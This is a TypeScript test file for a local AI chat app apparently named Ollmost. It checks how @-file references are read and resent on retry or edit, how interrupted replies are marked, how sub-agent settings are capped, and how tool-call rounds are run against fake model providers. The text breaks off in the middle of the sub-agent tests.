    writeFileSync(join(folder, 'src', 'b.ts'), 'three\n')
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'refs'
    })
    chat = reply('Read it.')
    const settled = (id: string) =>
      waitFor(() => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === id), 60_000)
    const userText = () =>
      (chatCalls[chatCalls.length - 1].messages as Array<{ role: string; content: string }>).findLast((m) => m.role === 'user')!.content

    const r = service.send({ ...sendBody(session.id), content: 'What does @src/a.ts do? Mail me@example.com, not @nowhere.ts.' })
    await settled(r.conversation.id)
    expect(userText()).toBe(
      '<referenced_file path="src/a.ts" lines="1-2 of 2">\n     1\tone\n     2\ttwo\n</referenced_file>\n\nWhat does @src/a.ts do? Mail me@example.com, not @nowhere.ts.'
    )
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).toMatch(/points to with @/)
    expect(events.find((e) => e.type === 'references')).toMatchObject({
      conversationId: session.id,
      messageId: r.userMessage!.id,
      references: [{ tokens: ['src/a.ts'], path: 'src/a.ts' }]
    })

    // The file changes; a Retry sends what the first reply was sent.
    writeFileSync(join(folder, 'src', 'a.ts'), 'changed\n')
    events.length = 0
    const again = await service.regenerate(session.id, { model: 'ollama/llama3.2', think: null })
    await settled(again.conversation.id)
    expect(userText()).toContain('     1\tone\n     2\ttwo')
    expect(getMessage(r.userMessage!.id)!.references![0].text).toBe('     1\tone\n     2\ttwo')

    // An edit is a new message: its references are read again.
    events.length = 0
    const edited = await service.edit(r.userMessage!.id, 'And @src/b.ts?', { model: 'ollama/llama3.2', think: null })
    await settled(edited.conversation.id)
    expect(userText()).toBe('<referenced_file path="src/b.ts" lines="1-1 of 1">\n     1\tthree\n</referenced_file>\n\nAnd @src/b.ts?')
  }, 120_000)

  it('leaves references unread while a command runs on the folder, for a Retry to read', async () => {
    const { paths } = await import('../src/main/paths')
    const { realpathSync, writeFileSync } = await import('node:fs')
    const { join } = await import('node:path')
    const lock = await import('../src/main/runner/lock')
    const { workspaceFor } = await import('../src/main/runner/workspace')
    const dir = tempDir('ollmost-service-refs-busy-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-refs-busy-'))
    writeFileSync(join(folder, 'a.ts'), 'x\n')
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'busy'
    })
    chat = reply('Later.')
    const userText = () =>
      (chatCalls[chatCalls.length - 1].messages as Array<{ role: string; content: string }>).findLast((m) => m.role === 'user')!.content
    const ws = workspaceFor(session.id)
    await lock.codeStarting(ws)
    let asked: string
    try {
      const r = service.send({ ...sendBody(session.id), content: 'Look at @a.ts' })
      asked = r.userMessage!.id
      await waitFor(() => events.find((e) => e.type === 'done' && e.conversationId === session.id), 60_000)
      expect(userText()).toBe('Look at @a.ts')
      expect(getMessage(asked)!.references).toBeNull()
      expect(events.some((e) => e.type === 'references')).toBe(false)
    } finally {
      await lock.codeEnded(ws)
    }

    // The command has ended: a Retry reads them.
    events.length = 0
    await service.regenerate(session.id, { model: 'ollama/llama3.2', think: null })
    await waitFor(() => events.find((e) => e.type === 'done' && e.conversationId === session.id), 60_000)
    expect(userText()).toBe('<referenced_file path="a.ts" lines="1-1 of 1">\n     1\tx\n</referenced_file>\n\nLook at @a.ts')
    expect(getMessage(asked)!.references).toMatchObject([{ path: 'a.ts', text: '     1\tx' }])
  }, 120_000)

  /** A code session on a new folder of the user's holding `files`, its scratch in a new folder of Ollmost's. */
  const sessionOn = (files: Record<string, string>) => {
    const dir = tempDir('ollmost-service-refs-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(tempDir('ollmost-user-refs-'))
    for (const [rel, text] of Object.entries(files)) writeFileSync(join(folder, rel), text)
    const session = createConversation({
      projectId: null,
      model: 'ollama/llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'refs'
    })
    return { folder, session }
  }
  /** The user's message in the last request the model got. */
  const lastUserText = () =>
    (chatCalls[chatCalls.length - 1].messages as Array<{ role: string; content: string }>).findLast((m) => m.role === 'user')!.content
  const replied = (id: string) =>
    waitFor(() => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === id), 60_000)
  const retry = (id: string) => service.regenerate(id, { model: 'ollama/llama3.2', think: null })

  it('stores and sends nothing when the reply is stopped while its references are read, so a Retry reads them afresh', async () => {
    const { folder, session } = sessionOn({ 'a.ts': 'old\n' })
    // A server that can't start: the note it leaves is gathered before the references are read.
    const absent = mcpConfig.saveServer({
      name: 'Absent',
      command: 'ollmost-no-such-server',
      args: [],
      cwd: null,
      env: {},
      defaultOn: false
    })
    chat = reply('Read it.')
    let release!: () => void
    const held = new Promise<void>((r) => (release = r))
    let reading = false
    // A read that ends only after the Stop, as a slow one would, and doesn't look at the signal itself.
    referenceReader.stand = async (ws, text) => {
      reading = true
      await held
      return referenceReader.real(ws, text)
    }
    let asked: string
    try {
      const r = service.send({ ...sendBody(session.id), content: 'Look at @a.ts', toolSources: [`mcp:${absent.id}`] })
      asked = r.userMessage!.id
      await waitFor(() => reading, 60_000)
      const stopped = service.stop(session.id)
      release()
      await stopped
      const done = await replied(session.id)
      expect(done.message.error).toBeNull()
      expect(done.message.stats?.unavailableTools).toEqual([expect.stringMatching(/^Absent couldn't start/)])
      expect(chatCalls).toHaveLength(0)
      expect(getMessage(asked)!.references).toBeNull()
      expect(events.some((e) => e.type === 'references')).toBe(false)
      expect(listTraces(session.id).filter((t) => t.kind === 'chat')).toEqual([])
    } finally {
      referenceReader.stand = null
    }

    writeFileSync(join(folder, 'a.ts'), 'new\n')
    events.length = 0
    await retry(session.id)
    await replied(session.id)
    expect(lastUserText()).toBe('<referenced_file path="a.ts" lines="1-1 of 1">\n     1\tnew\n</referenced_file>\n\nLook at @a.ts')
    expect(getMessage(asked)!.references).toMatchObject([{ path: 'a.ts', text: '     1\tnew' }])
  }, 120_000)

  it('says under the reply why a message’s references weren’t sent, and leaves them for a Retry', async () => {
    const { CodeRunningError } = await import('../src/main/runner/lock')
    const { RootMissingError } = await import('../src/main/runner/workspace')
    const { folder, session } = sessionOn({ 'a.ts': 'x\n' })
    chat = reply('Later.')
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const error = vi.spyOn(console, 'error').mockImplementation(() => {})
    let asked: string
    try {
      // The session was readied, then a command started in the folder before its references were read.
      referenceReader.stand = () => Promise.reject(new CodeRunningError("this session's folder"))
      const r = service.send({ ...sendBody(session.id), content: 'Look at @a.ts' })
      asked = r.userMessage!.id
      let done = await replied(session.id)
      expect(lastUserText()).toBe('Look at @a.ts')
      expect(getMessage(asked)!.references).toBeNull()
      expect(done.message.error).toBeNull()
      expect(done.message.stats?.unsentReferences).toBe(
        "Your message's @ references weren't sent: a command was running in the session's folder. Retry sends them."
      )
      expect(done.message.stats?.unavailableTools).toBeUndefined()
      expect(warn).toHaveBeenCalledTimes(1)

      referenceReader.stand = () => Promise.reject(new RootMissingError(folder))
      events.length = 0
      await retry(session.id)
      done = await replied(session.id)
      expect(done.message.stats?.unsentReferences).toBe(
        `Your message's @ references weren't sent. This session's folder is no longer at ${folder} (moved, renamed or deleted). Choose it again to carry on.`
      )
      expect(done.message.stats?.unavailableTools).toBeUndefined()
      expect(warn).toHaveBeenCalledTimes(2)

      referenceReader.stand = () => Promise.reject(new Error('disk on fire'))
      events.length = 0
      await retry(session.id)
      done = await replied(session.id)
      expect(done.message.stats?.unsentReferences).toBe(
        "Your message's @ references weren't sent: they couldn't be read. Retry sends them."
      )
      expect(done.message.stats?.unavailableTools).toBeUndefined()
      expect(error).toHaveBeenCalledWith(expect.stringContaining('@ references'), expect.objectContaining({ message: 'disk on fire' }))
      expect(getMessage(asked)!.references).toBeNull()
    } finally {
      referenceReader.stand = null
      warn.mockRestore()
      error.mockRestore()
    }

    events.length = 0
    await retry(session.id)
    const done = await replied(session.id)
    expect(lastUserText()).toBe('<referenced_file path="a.ts" lines="1-1 of 1">\n     1\tx\n</referenced_file>\n\nLook at @a.ts')
    expect(done.message.stats?.unavailableTools).toBeUndefined()
    expect(done.message.stats?.unsentReferences).toBeUndefined()
  }, 120_000)

  it('gives a message’s references half the room the model’s window has left, so the turn’s tool rounds fit too', async () => {
    const { promptBudget } = await import('../src/main/chat/assemble')
    const line = `${'x'.repeat(40)}\n`
    // About 24,000 characters each: two of them are twice what an 8,192-token window has room for.
    const { session } = sessionOn({ 'a.txt': line.repeat(600), 'b.txt': line.repeat(600) })
    // Two earlier exchanges with some substance, as a real session has: they fill what the references leave.
    chat = reply(`Noted. ${'It keeps its sources under src and its tests under tests. '.repeat(10)}`)
    for (const q of ['What is this project?', 'And how is it tested?']) {
      events.length = 0
      service.send({ ...sendBody(session.id), content: q })
      await replied(session.id)
      await waitFor(() => !service.isReplyingIn(session.id))
    }
    const earlier = chatCalls.length
    // One round reads more of a file, then the model answers.
    chat = (b, res, n) =>
      n === earlier + 1 ? void res.writeHead(200).end(toolCall('read_file', { path: 'a.txt', offset: 300 })) : reply('Both big.')(b, res, n)
    events.length = 0
    const r = service.send({ ...sendBody(session.id), content: 'Compare @a.txt with @b.txt' })
    const done = await replied(session.id)
    expect(done.message.toolEvents.map((e) => [e.tool, e.ok])).toEqual([['read_file', true]])
    const refs = getMessage(r.userMessage!.id)!.references!
    expect(refs.map((ref) => ref.refused ?? 'read')).toEqual(['read', 'over the limit'])
    expect(refs[0].lines!.to).toBeLessThan(600)
    const limit = Number(/reached their limit of ([\d,]+) characters, so b\.txt wasn't included/.exec(refs[1].text)![1].replace(/,/g, ''))
    expect(refs[0].text.length).toBeLessThanOrEqual(limit)
    // Each request of the turn, its references, the earlier turns and the round's result in it, fits what the window
    // leaves for a prompt.
    const tokens = (body: Record<string, unknown>) =>
      (body.messages as Array<{ content: string }>).reduce((n, m) => n + Math.ceil(m.content.length / 4), 0) +
      Math.ceil(JSON.stringify(body.tools ?? []).length / 4)
    const turn = chatCalls.slice(earlier)
    expect(turn).toHaveLength(2)
    expect((turn[0].messages as Array<{ content: string }>).map((m) => m.content)).toContain('And how is it tested?')
    for (const body of turn) expect(tokens(body)).toBeLessThanOrEqual(promptBudget(8192))
    // The references took about half the room the first request had for its history, not all of it.
    const system = Math.ceil((turn[0].messages as Array<{ content: string }>)[0].content.length / 4)
    const room = promptBudget(8192) - system - Math.ceil(JSON.stringify(turn[0].tools ?? []).length / 4)
    expect(limit).toBeLessThanOrEqual(room * 4 * 0.55)
  }, 120_000)

  it('reads a message that named nothing only once: a Retry sends it as it was', async () => {
    const { session } = sessionOn({ 'a.ts': 'x\n' })
    chat = reply('Fine.')
    let reads = 0
    referenceReader.stand = (...args) => {
      reads++
      return referenceReader.real(...args)
    }
    try {
      const r = service.send({ ...sendBody(session.id), content: 'Nothing named here, write to me@example.com' })
      await replied(session.id)
      expect(getMessage(r.userMessage!.id)!.references).toEqual([])
      events.length = 0
      await retry(session.id)
      await replied(session.id)
      expect(reads).toBe(1)
      expect(events.some((e) => e.type === 'references')).toBe(false)
    } finally {
      referenceReader.stand = null
    }
  }, 120_000)

  it('drops the @ menu’s list when a reply ends, so a file made meanwhile shows', async () => {
    const { sessionPaths } = await import('../src/main/code/pathList')
    const { workspaceFor } = await import('../src/main/runner/workspace')
    const { folder, session } = sessionOn({ 'a.ts': 'x\n' })
    const ws = workspaceFor(session.id)
    expect((await sessionPaths(ws)).paths).toContain('a.ts')
    // As a command would: the kept list doesn't know of it yet.
    writeFileSync(join(folder, 'b.ts'), 'y\n')
    expect((await sessionPaths(ws)).paths).not.toContain('b.ts')
    chat = reply('Done.')
    service.send({ ...sendBody(session.id), content: 'hi' })
    await replied(session.id)
    await waitFor(() => !service.isReplyingIn(session.id))
    expect((await sessionPaths(ws)).paths).toContain('b.ts')
  }, 120_000)

  it('leaves a chat’s @ text alone, even with the code runner on', async () => {
    const dir = tempDir('ollmost-service-refs-chat-')
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    chat = reply('Plain.')
    let reads = 0
    referenceReader.stand = (...args) => {
      reads++
      return referenceReader.real(...args)
    }
    try {
      const r = service.send({
        conversationId: null,
        projectId: null,
        content: 'Look at @a.ts',
        attachmentIds: [],
        model: 'ollama/llama3.2',
        think: null,
        skills: [],
        toolSources: ['code']
      })
      const done = await replied(r.conversation.id)
      expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).toMatch(/<code_runner>/)
      expect(lastUserText()).toBe('Look at @a.ts')
      expect(getMessage(r.userMessage!.id)!.references).toBeNull()
      expect(events.some((e) => e.type === 'references')).toBe(false)
      expect(done.message.stats?.unavailableTools).toBeUndefined()
      expect(reads).toBe(0)
    } finally {
      referenceReader.stand = null
    }
  }, 120_000)
})

describe('markInterruptedReplies', () => {
  it('flags replies that never got their final save, and only those', () => {
    const c = createConversation({ projectId: null, model: 'ollama/llama3.2', think: null, skills: [], toolSources: [] })
    const user = insertMessage({ conversationId: c.id, parentId: null, role: 'user', content: 'hi' })
    const cut = insertMessage({ conversationId: c.id, parentId: user.id, role: 'assistant', content: '' })
    // A checkpoint wrote text and a running tool, then the app died.
    updateMessage(cut.id, {
      content: 'so far',
      toolEvents: [
        { tool: 'web_search', args: {}, ok: true, pending: true, summary: 'ollmost' },
        { tool: 'notes__delete', args: {}, ok: true, pending: true, awaiting: true, summary: 'note 7' }
      ]
    })
    const finished = insertMessage({ conversationId: c.id, parentId: user.id, role: 'assistant', content: 'done' })
    updateMessage(finished.id, { stats: { promptTokens: 1, completionTokens: 1 } })

    expect(service.markInterruptedReplies()).toBeGreaterThanOrEqual(1)
    const after = getMessage(cut.id)!
    expect(after.content).toBe('so far')
    expect(after.error).toMatch(/closed before this reply finished/)
    expect(after.toolEvents[0]).toMatchObject({ pending: false, ok: false })
    // A call still waiting for an answer never ran.
    expect(after.toolEvents[1]).toEqual({ tool: 'notes__delete', args: {}, ok: false, pending: false, summary: 'note 7 (not run)' })
    // Checkpoints skip search indexing; marking the reply indexes the text it kept.
    expect(search('so far').map((h) => h.conversationId)).toContain(c.id)
    expect(getMessage(finished.id)!.error).toBeNull()
  })
})

describe('sub-agent settings and usage', () => {
  it('defaults sub-agents to on, capped at 20 rounds, 3 at once, replies of 24,000 characters', () => {
    expect(getSettings().delegate).toEqual({ enabled: true, maxRounds: 20, parallel: 3, resultChars: 24_000 })
  })

  it('runs 1 to 5 sub-agents at once, and 3 when the setting is missing or not a number', async () => {
    const { subAgentsAtOnce } = await import('../src/main/chat/delegate')
    // Settings aren't checked over IPC, and a file saved before the setting existed has none.
    const atOnce = (parallel: unknown) => subAgentsAtOnce({ enabled: true, maxRounds: 20, parallel } as Settings['delegate'])
    expect(atOnce(2)).toBe(2)
    expect(atOnce(5)).toBe(5)
    expect(atOnce(99)).toBe(5)
    expect(atOnce(0)).toBe(1)
    expect(atOnce(-2)).toBe(1)
    expect(atOnce(2.7)).toBe(2)
    expect(atOnce(undefined)).toBe(3)
    expect(atOnce(Number.NaN)).toBe(3)
    expect(atOnce('4')).toBe(3)
  })

  it('lets a sub-agent make 1 to 40 requests, and 20 when the setting is missing or not a number', async () => {
    const { subAgentRounds } = await import('../src/main/chat/delegate')
    const rounds = (maxRounds: unknown) =>
      subAgentRounds({ enabled: true, maxRounds, parallel: 3, resultChars: 24_000 } as Settings['delegate'])
    expect(rounds(10)).toBe(10)
    expect(rounds(40)).toBe(40)
    expect(rounds(1e9)).toBe(40)
    expect(rounds(41)).toBe(40)
    expect(rounds(0)).toBe(1)
    expect(rounds(-1)).toBe(1)
    expect(rounds(2.5)).toBe(2)
    expect(rounds(undefined)).toBe(20)
    expect(rounds(null)).toBe(20)
    expect(rounds('abc')).toBe(20)
    expect(rounds(Number.NaN)).toBe(20)
  })

  it('gives back 1,500 to 48,000 characters of a sub-agent’s reply, and 24,000 when the setting is missing or not a number', async () => {
    const { subAgentReplyChars } = await import('../src/main/chat/delegate')
    const replyChars = (resultChars: unknown) =>
      subAgentReplyChars({ enabled: true, maxRounds: 20, parallel: 3, resultChars } as Settings['delegate'])
    expect(replyChars(12_000)).toBe(12_000)
    expect(replyChars(48_000)).toBe(48_000)
    expect(replyChars(1e9)).toBe(48_000)
    expect(replyChars(0)).toBe(1_500)
    expect(replyChars(-5)).toBe(1_500)
    expect(replyChars(20_000.9)).toBe(20_000)
    expect(replyChars(undefined)).toBe(24_000)
    expect(replyChars(Number.NaN)).toBe(24_000)
    expect(replyChars(Number.POSITIVE_INFINITY)).toBe(24_000)
    expect(replyChars('48000')).toBe(24_000)
  })

  it('counts a sub-agent’s rows in the chat’s totals but not as its context', () => {
    const c = createConversation({ projectId: null, model: 'm', think: null, skills: [], mode: 'chat' })
    insertUsageEvent({
      conversationId: c.id,
      messageId: null,
      model: 'm',
      kind: 'chat',
      promptTokens: 100,
      completionTokens: 10,
      costUsd: null,
      billing: 'priced',
      estimated: false
    })
    insertUsageEvent({
      conversationId: c.id,
      messageId: null,
      model: 'm',
      kind: 'delegate',
      promptTokens: 5000,
      completionTokens: 50,
      costUsd: null,
      billing: 'priced',
      estimated: false
    })
    const u = conversationUsage(c.id, getSettings().endpoints)
    expect(u.promptTokens + u.completionTokens).toBe(5160)
    expect(u.lastContextTokens).toBe(110)
  })
})

describe('runRounds', () => {
  // A tool that runs unasked and says back what it was given.
  const echo: ToolProvider = {
    id: 'echo-test',
    tools: () => [
      {
        type: 'function',
        function: { name: 'echo', description: 'echo', parameters: { type: 'object', properties: { text: { type: 'string' } } } }
      }
    ],
    pending: (call) => ({ tool: 'echo', args: call.args, ok: true, pending: true, summary: 'echoing' }),
    approval: () => 'auto',
    run: async (call) => ({
      content: `echo: ${String(call.args.text)}`,
      event: { tool: 'echo', args: call.args, ok: true, summary: 'echoed' }
    })
  }

  async function setup() {
    const conversation = createConversation({ projectId: null, model: 'ollama/llama3.2', think: null, skills: [], mode: 'chat' })
    const message = insertMessage({
      conversationId: conversation.id,
      parentId: null,
      role: 'assistant',
      content: '',
      model: 'ollama/llama3.2'
    })
    const model = await modelInfo('ollama/llama3.2')
    const body: RoundsInput['body'] = {
      model: 'llama3.2',
      messages: [
        { role: 'system', content: 'test' },
        { role: 'user', content: 'hi' }
      ],
      tools: echo.tools({ mode: 'chat', skills: false, web: false, sources: [], workspace: null }),
      think: null,
      profile: { kind: 'none' },
      contextWindow: null
    }
    const stats: MessageStats = { promptTokens: 0, completionTokens: 0 }
    const seen: Array<[number, boolean]> = []
    const usage: number[] = []
    const input: RoundsInput = {
      conversationId: conversation.id,
      messageId: message.id,
      loopId: 'loop-1',
      modelName: 'ollama/llama3.2',
      model,
      provider: resolve('llama3.2').provider,
      body,
      budget: 8000,
      maxRounds: 4,
      toolContext: { mode: 'chat', skills: false, web: false, sources: [], workspace: null },
      signal: new AbortController().signal,
      stats,
      usageKind: 'delegate',
      traceKind: 'delegate',
      onDelta: () => {},
      onToolEvent: (index, event) => seen.push([index, !!event.pending]),
      onUsage: () => usage.push(1),
      onLoadedSkill: () => {},
      checkpoint: () => {}
    }
    return { conversation, message, body, stats, seen, usage, input }
  }

  it('runs a tool round then an answer, keyed by its own loop id and usage kind', async () => {
    const off = registerToolProvider(echo)
    try {
      chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('echo', { text: 'hi' })) : reply('done')(b, res, n))
      const { conversation, message, body, stats, seen, usage, input } = await setup()
      const out = await runRounds(input)
      expect(out.content).toBe('done')
      expect(out.rounds).toBe(2)
      expect(out.error).toBeNull()
      expect(out.toolEvents).toEqual([expect.objectContaining({ tool: 'echo', ok: true, at: 0 })])
      expect(seen).toEqual([
        [0, true],
        [0, false]
      ])
      expect(usage).toHaveLength(1)
      expect(body.messages.map((m) => m.role)).toEqual(['system', 'user', 'assistant', 'tool'])
      expect(stats.promptTokens).toBeGreaterThan(0)
      // Traces go under the loop's id; usage rows under the message, with the loop's kind.
      const traces = listTraces(conversation.id)
      expect(traces.filter((t) => t.kind === 'delegate').map((t) => t.messageId)).toEqual(['loop-1', 'loop-1'])
      expect(traces.filter((t) => t.kind === 'tool').map((t) => t.messageId)).toEqual(['loop-1'])
      const rows = all<{ kind: string; message_id: string }>(
        'SELECT kind, message_id FROM usage_events WHERE conversation_id = ?',
        conversation.id
      )
      expect(rows).toEqual([
        { kind: 'delegate', message_id: message.id },
        { kind: 'delegate', message_id: message.id }
      ])
      expect(conversationUsage(conversation.id, getSettings().endpoints).promptTokens).toBeGreaterThan(0)
    } finally {
      off()
    }
  })

  it('withdraws tools on the last round', async () => {
    const off = registerToolProvider(echo)
    try {
      chat = (b, res, n) => (n < 2 ? void res.writeHead(200).end(toolCall('echo', { text: String(n) })) : reply('end')(b, res, n))
      const { input, stats } = await setup()
      const out = await runRounds({ ...input, maxRounds: 2 })
      expect(out.content).toBe('end')
      expect(out.rounds).toBe(2)
      expect(chatCalls[0].tools).toBeDefined()
      expect(chatCalls[1].tools).toBeUndefined()
      expect(stats.toolRoundLimit).toBe(2)
    } finally {
      off()
    }
  })

  it('ends quietly when stopped mid-stream, with the round traced as aborted', async () => {
    const controller = new AbortController()
    // Sends a first piece and then hangs, as a model still writing does; the first piece stops it.
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'part' }, done: false })])
    const { conversation, input } = await setup()
    const out = await runRounds({
      ...input,
      signal: controller.signal,
      onDelta: (d) => {
        if (d.content) controller.abort()
      }
    })
    expect(out.content).toBe('part')
    expect(out.error).toBeNull()
    expect(out.rounds).toBe(1)
    expect(listTraces(conversation.id).find((t) => t.kind === 'delegate')?.status).toBe('aborted')
  })

  it('runs calls that may go together at once, each with an even share of the room, their results in call order', async () => {
    // A tool that may run beside others: it notes the room it was given, and the later calls finish first.
    const shares: number[] = []
    const gather: ToolProvider = {
      id: 'gather-test',
      parallel: true,
      tools: () => [{ type: 'function', function: { name: 'gather', description: 'gather', parameters: { type: 'object' } } }],
      pending: (call) => ({ tool: 'gather', args: call.args, ok: true, pending: true, summary: 'gathering' }),
      approval: () => 'auto',
      run: async (call, ctx) => {
        shares.push(ctx.maxResultChars!)
        const index = ctx.callIndex!
        await new Promise((r) => setTimeout(r, (3 - index) * 30))
        return { content: `result ${index}`.padEnd(100, '.'), event: { tool: 'gather', args: call.args, ok: true, summary: 'gathered' } }
      }
    }
    const off = registerToolProvider(gather)
    try {
      const threeCalls =
        line({
          message: { role: 'assistant', content: '', tool_calls: [0, 1, 2].map(() => ({ function: { name: 'gather', arguments: {} } })) },
          done: false
        }) + line({ done: true })
      chat = (b, res, n) =>
        (b.messages as Array<{ role: string }>).some((m) => m.role === 'tool')
          ? reply('done')(b, res, n)
          : void res.writeHead(200).end(threeCalls)
      // One at a time, each call's share is what's left when it starts, so the last gets all of it: the room is that
      // share and the two results before it.
      const one = await setup()
      await runRounds({ ...one.input, budget: 3000, parallel: 1 })
      const oneByOne = shares.splice(0)
      const room = oneByOne[2] + 200
      expect(oneByOne[1]).toBeGreaterThan(oneByOne[0])

      const together = await setup()
      const out = await runRounds({ ...together.input, budget: 3000, parallel: 3 })
      // Each got its share of the room as it stood before any ran, and together they fit in it.
      expect(shares).toEqual([oneByOne[0], oneByOne[0], oneByOne[0]])
      expect(shares[0] * 3).toBeLessThanOrEqual(room)
      // Every call showed, in order, before any ran; each result lands in call order, whichever finished first.
      expect(together.seen.slice(0, 3)).toEqual([
        [0, true],
        [1, true],
        [2, true]
      ])
      expect(together.seen.slice(3)).toEqual([
        [2, false],
        [1, false],
        [0, false]
      ])
      const results = together.body.messages.filter((m) => m.role === 'tool').map((m) => m.content.slice(0, 8))
      expect(results).toEqual(['result 0', 'result 1', 'result 2'])
      expect(out.toolEvents.map((e) => e.pending)).toEqual([undefined, undefined, undefined])
    } finally {
      off()
    }
  })

  it('echoes a call exactly as Ollama sent it, and never sends an id Ollmost made up', async () => {
    const off = registerToolProvider(echo)
    try {
      const calls = [
        { function: { index: 0, name: 'echo', arguments: { text: 'a' } } },
        { id: 'call_ollama', function: { index: 1, name: 'echo', arguments: { text: 'b' } } }
      ]
      chat = (b, res, n) =>
        n === 1
          ? void res
              .writeHead(200)
              .end(line({ message: { role: 'assistant', content: '', tool_calls: calls }, done: false }) + line({ done: true }))
          : reply('done')(b, res, n)
      const { input } = await setup()
      await runRounds(input)
      expect(JSON.stringify((chatCalls[1].messages as unknown[]).slice(2))).toBe(
        JSON.stringify([
          { role: 'assistant', content: '', tool_calls: calls },
          { role: 'tool', content: 'echo: a', tool_name: 'echo' },
          { role: 'tool', content: 'echo: b', tool_name: 'echo' }
        ])
      )
    } finally {
      off()
    }
  })

  it('runs on any provider’s neutral events: ids on the echo and the result, usage, timing and why it ended', async () => {
    const off = registerToolProvider(echo)
    try {
      const { conversation, stats, input } = await setup()
      const script: ProviderEvent[][] = [
        [
          { type: 'thinking', text: 'Echo it.' },
          { type: 'content', text: 'Let me echo.' },
          { type: 'toolCall', call: { id: 'call_x', function: { name: 'echo', arguments: '{"text":"hi"}' } } },
          { type: 'done', usage: { prompt: 20, completion: 6 }, finishReason: 'tool_calls', timing: { genMs: 1000 }, raw: { id: 'r1' } }
        ],
        [
          { type: 'content', text: 'done' },
          { type: 'done', usage: { prompt: 40, completion: 2 }, finishReason: 'stop', timing: { genMs: 500 }, raw: { id: 'r2' } }
        ]
      ]
      const requests: ChatRequest[] = []
      const provider: Provider = {
        id: 'fake',
        endpoint: { id: 'fake', name: 'Fake', kind: 'openai', flavor: 'generic', baseUrl: 'fake://', enabled: true, hasKey: false },
        listModels: () => Promise.resolve([]),
        modelInfo: () => Promise.reject(new Error('not used')),
        async *chatStream(req) {
          requests.push(structuredClone(req))
          yield* script[requests.length - 1]
        },
        chatOnce: () => Promise.reject(new Error('not used')),
        wire: (req, stream) => ({ endpoint: 'fake://chat', body: { model: req.model, stream } }),
        wireEndpoint: () => 'fake://chat',
        sendWire: () => Promise.reject(new Error('not used'))
      }
      const out = await runRounds({ ...input, provider })
      expect(out).toMatchObject({ content: 'Let me echo.\n\ndone', thinking: 'Echo it.', rounds: 2, error: null, genMs: 1500 })
      expect(requests[1].messages.slice(-2)).toEqual([
        {
          role: 'assistant',
          content: 'Let me echo.',
          thinking: 'Echo it.',
          toolCalls: [{ id: 'call_x', function: { name: 'echo', arguments: '{"text":"hi"}' } }]
        },
        { role: 'tool', content: 'echo: hi', toolName: 'echo', toolCallId: 'call_x' }
      ])
      expect(stats).toMatchObject({ promptTokens: 60, completionTokens: 8, doneReason: 'stop' })
      expect(stats.estimated).toBeUndefined()
      const first = listTraces(conversation.id).find((t) => t.kind === 'delegate')!
      expect(getTrace(first.id)).toMatchObject({
        endpoint: 'fake://chat',
        request: { model: 'llama3.2', stream: true },
        response: { final: { id: 'r1' } }
      })
    } finally {
      off()
    }
  })

  it('times a round by the clock only across 50 ms or more, and always by a generation time its server reports', async () => {
    let now = Date.now()
    const clock = vi.spyOn(Date, 'now').mockImplementation(() => now)
    try {
      // One text round, `spanMs` from its first token to its end, with or without the server's own time.
      const round = async (spanMs: number, reported?: number) => {
        const { input } = await setup()
        const provider: Provider = {
          id: 'fake',
          endpoint: { id: 'fake', name: 'Fake', kind: 'openai', flavor: 'generic', baseUrl: 'fake://', enabled: true, hasKey: false },
          listModels: () => Promise.resolve([]),
          modelInfo: () => Promise.reject(new Error('not used')),
          async *chatStream() {
            yield { type: 'content', text: 'Hi there' }
            now += spanMs
            yield { type: 'done', usage: { prompt: 5, completion: 4 }, finishReason: 'stop', timing: { genMs: reported }, raw: {} }
          },
          chatOnce: () => Promise.reject(new Error('not used')),
          wire: (req, stream) => ({ endpoint: 'fake://chat', body: { model: req.model, stream } }),
          wireEndpoint: () => 'fake://chat',
          sendWire: () => Promise.reject(new Error('not used'))
        }
        const { genMs, timedTokens, error } = await runRounds({ ...input, provider })
        return { genMs, timedTokens, error }
      }
      expect(await round(30)).toEqual({ genMs: 0, timedTokens: 0, error: null })
      expect(await round(60)).toEqual({ genMs: 60, timedTokens: 4, error: null })
      expect(await round(0, 10)).toEqual({ genMs: 10, timedTokens: 4, error: null })
    } finally {
      clock.mockRestore()
    }
  })
})

describe('sub-agents', () => {
  const CUT_MARK = '\n\n[… the sub-agent’s reply was cut here]'
  const isChild = (b: Record<string, unknown>) => String((b.messages as Array<{ content: string }>)[0].content).includes('<sub_agent>')
  const hasToolResult = (b: Record<string, unknown>) => (b.messages as Array<{ role: string }>).some((m) => m.role === 'tool')
  const toolResults = (b: Record<string, unknown>) => (b.messages as Array<{ role: string }>).filter((m) => m.role === 'tool').length
  const delegateCall = (task: string) => toolCall('delegate', { task })
  const offeredIn = (b: Record<string, unknown>) => ((b.tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
  const toolEventsIn = (conversationId: string) =>
    events.filter((e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId)
  const toolMessageIn = (b: Record<string, unknown>) =>
    (b.messages as Array<{ role: string; content: string }>).find((m) => m.role === 'tool')!.content
  const toolMessagesIn = (b: Record<string, unknown>) =>
    (b.messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool').map((m) => m.content)
  /** A child's task, as its user message holds it. */
  const taskOf = (b: Record<string, unknown>) =>
    String((b.messages as Array<{ role: string; content: string }>).find((m) => m.role === 'user')!.content)
  const systemOf = (b: Record<string, unknown>) => String((b.messages as Array<{ content: string }>)[0].content)
  /** A round in which the model makes these calls together. */
  const callsTogether = (...calls: Array<[string, Record<string, unknown>]>) =>
    line({
